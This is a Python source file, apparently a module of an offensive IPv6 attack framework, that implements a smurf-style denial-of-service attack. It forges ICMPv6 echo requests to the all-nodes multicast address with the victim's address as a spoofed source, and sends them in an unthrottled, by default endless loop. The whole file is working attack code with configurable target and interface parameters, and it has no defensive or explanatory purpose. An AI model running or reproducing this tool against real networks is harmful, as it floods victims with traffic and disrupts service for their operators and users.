from deadbeef_modules import ipv6module

from scapy.all import *

# smurf denial of service module
class ipv6_smurf_module(ipv6module):
    """
    do a smurf like dos attack by sending multicast icmpv6 echo requests from the target ip
    """
    
    def init_module(self):
        self.prompt = self.cc.prompt(self.prompt, "smurf dos")                      
        self.valid_parameters = ['target', 'packets', 'iface']
        self.help_parameters['iface'] = "use this interface"
        self.help_parameters['target'] = "target to attack with icmp flood"
        self.help_parameters['packets'] = "number of packets to send (default=unlimited)"
        
        self.required_parameters = ['target', 'iface']

    def help(self):
        print "attack a ipv6 node using a smurf like attack (icmpv6 multicast)"
        
    def start(self, cmdline):
        self.cc.ok("starting smurf attack...\n")        
        icmpv6_multicast = Ether()/IPv6(dst="ff02::1", src=self.parameters['target'])/ICMPv6EchoRequest()
        
        arguments = {'loop': 1, 'inter': 0, 'verbose': 0}           
        if 'packets' in self.parameters.keys():
            arguments['count'] = int(self.parameters['packets'])            
            
        conf.iface6 = self.parameters['iface']
        self.add_job(cmd = sendp, args = (icmpv6_multicast, ), kwargs = arguments)

    def stop(self, cmdline):
        self.cc.ok("stopping smurf attack...\n")        
        
        self.kill_job()

